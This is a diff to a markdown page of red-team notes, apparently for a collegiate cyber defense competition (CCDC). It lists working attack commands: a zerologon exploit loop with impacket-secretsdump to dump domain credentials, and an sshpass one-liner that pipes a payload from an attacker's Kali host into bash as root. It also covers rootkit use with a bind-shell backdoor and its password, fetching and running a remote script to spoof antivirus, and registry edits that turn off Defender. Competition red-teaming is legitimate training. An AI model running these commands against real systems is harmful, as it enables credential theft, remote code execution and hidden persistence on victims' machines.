@@ -14,6 +14,7 @@ pagetitle: Red Teaming for CCDC
     - Instead of `-T4`, we can specify `--max-retries 2 --max-rtt-timeout {double_time_to_ping}ms --min-rate 300`
   - Then, check SMB IPs with `while read -r line; do nxc smb $line -u '' -p '' -M zerologon -M printnightmare -M smbghost -M ms17-010; done < smb_ips.txt` 
     - If we get a zerologon hit, run `zerologon.py` and then `impacket-secretsdump -just-dc -no-pass {domain}/{machine_name}:@{DC_IP}`
+      - `for i in {1..10}; do python3 zerologon.py {DC_name} {DC_IP_with_$i}; done`
       - e.g. `impacket-secretsdump -just-dc -no-pass 'corp.local/TEST-DC$@10.10.0.162'` (if DC name is TEST-DC)
   - Simultaneously run a scan for all port 22s (so we can use them when we find the default password)
     - `sudo nmap -sV -O -T4 -min-hostgroup 96 -p 22 {IP_range}`
@@ -82,26 +83,31 @@ pagetitle: Red Teaming for CCDC
   - One-stop shop for lots of persistence methods, this thing is a great reference
 - Todo:
   - Replace prism with Waterfall
+    - By god it's beautiful
   - Get something going for alpine/RHEL/Nixos
-    - Write a general script which determines version and then executes the other scripts
+    - Put it all in one big script
+      - See how much we can pre-compile?
+    - RHEL
+      - Figure out service error message
+      - Figure out whether we want to dnf install in installation script
+        - Also need to add -y if so
     - Alpine
       - Add a second location for SSH keys 
     - Nixos
+      - Get gcc with `nix-shell -p libgcc pam`
       - Figure out which PAM file controls auth and modify it
   - Scripting across teams
     - Running commands with SSH by putting it after the command
       - `echo "{password}" | sshpass -p "{password}" ssh -o StrictHostKeyChecking=no "{username}@{ip}" "sudo -S id"`
-      - `echo "{password}" | sshpass -p "{password}" ssh -o StrictHostKeyChecking=no "{username}@{ip}" "sudo -S bash -c 'curl -L {kali_IP}:{port}/p.sh | bash -s {kali_IP}:{port}'"`
         - This will work regardless of whether the password is actually required
-    - One-liners to generate IPs
-- [Prism](https://github.com/andreafabrizi/prism)
-  - `gcc -DDETACH -DNORENAME -Wall -s -o prism prism.c` or if that fails just download and run `prism`
-  - Then run `sudo python2 sendPacket.py {target_IP} {password} {attacker_IP} {attacker_port}`
+      - `echo "{password}" | sshpass -p "{password}" ssh -o StrictHostKeyChecking=no "{username}@{ip}" "sudo -S bash -c 'curl -L {kali_IP}:{port}/p.sh | bash -s {kali_IP}:{port}'"`
+        - Can use `ssh_across_ips.py`
+          - `ssh_across_ips.py 10.100.100-120.35 {username} {password} '{command}'`
+        - `for i in {1..10}; do echo $i; done`
 - [BDS](https://github.com/bluedragonsecurity/bds_lkm_ftrace)
   - Good compatibility, works on 6.x tested
-    - Let's check out the non-ftrace one and userland one?
-    - We need to slightly modify to allow hiding arbitrary ports/sockets
     - Removed `rc.local` persistence - non-sneaky, and borks systems with checks for kernel tainting in startup
+    - Needed to add `dnf install -y kernel-devel-$(uname -r)` for RHEL-based systems
   - Supports hiding files, backdoors, privescs, and hiding network connections (though only its connection, but we can easily change that)
     - Root with `kill 000`
     - Open bind shell with `nc {target_IP} 1338` and then access with `nc {target_IP} 31337` with password `bluedragonsec`
@@ -246,7 +252,7 @@ pagetitle: Red Teaming for CCDC
   - `Add-MpPreference -ExclusionPath "{path_to_excluded_folder}"`
 - We can spoof another antivirus with DefendNot
   - `& ([ScriptBlock]::Create((irm https://dnot.sh/))) --name "{custom_AV_name}"`
-  - This does give a red defender icon, however
+    - We'll need an exclusion on `C:\` first (technically `\Users` and `\Program Files`)
 - Permanently disable with:
   - `reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f`
   - `gpedit.msc` > Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus > Turn off Microsoft Defender Antivirus > Enabled
